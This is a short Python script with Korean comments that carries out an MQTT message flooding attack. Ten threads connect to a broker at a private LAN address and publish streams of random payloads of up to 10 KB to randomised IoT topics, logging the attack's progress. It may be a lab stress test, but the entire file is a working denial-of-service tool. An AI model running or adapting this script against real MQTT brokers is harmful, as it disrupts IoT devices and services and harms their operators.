import paho.mqtt.client as mqtt
import threading
import random
import time
import string

# 설정
BROKER = "192.168.100.133"
PORT = 1883
NUM_THREADS = 10        # 스레드 개수
MESSAGES_PER_THREAD = 100 # 스레드당 메시지 수

def generate_random_data(size):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=size)).encode()

def flood_attack(thread_id):
    try:
        client = mqtt.Client()
        client.connect(BROKER, PORT, 60)
        
        print(f"[Thread {thread_id}] 연결 성공, 공격 시작...")
        
        for i in range(MESSAGES_PER_THREAD):
            data_size = random.randint(100, 10000) # 100B ~ 10KB
            payload = generate_random_data(data_size)
            
            # 토픽 랜덤화로 부하 분산
            sub_topic = random.choice(['image', 'data', 'sensor', 'control'])
            topic = f"iot/{sub_topic}"
            
            client.publish(topic, payload, qos=0)
            
            if i % 20 == 0:
                print(f"[Thread {thread_id}] {i}/{MESSAGES_PER_THREAD} 메시지 전송")
            
            time.sleep(0.01) # 매우 빠른 전송
            
        print(f"[Thread {thread_id}] 공격 완료")
        client.disconnect()
        
    except Exception as e:
        print(f"[Thread {thread_id}] Error: {e}")

def main():
    print("[*] 메시지 플러딩 공격 시작...")
    threads = []
    
    for i in range(NUM_THREADS):
        t = threading.Thread(target=flood_attack, args=(i,))
        threads.append(t)
        t.start()
        print(f"[+] 연결 {i} 성공 (스레드 시작)")
        
    for t in threads:
        t.join()
        
    print("[+] 연결 플러딩 공격 완료")

if __name__ == "__main__":
    main()
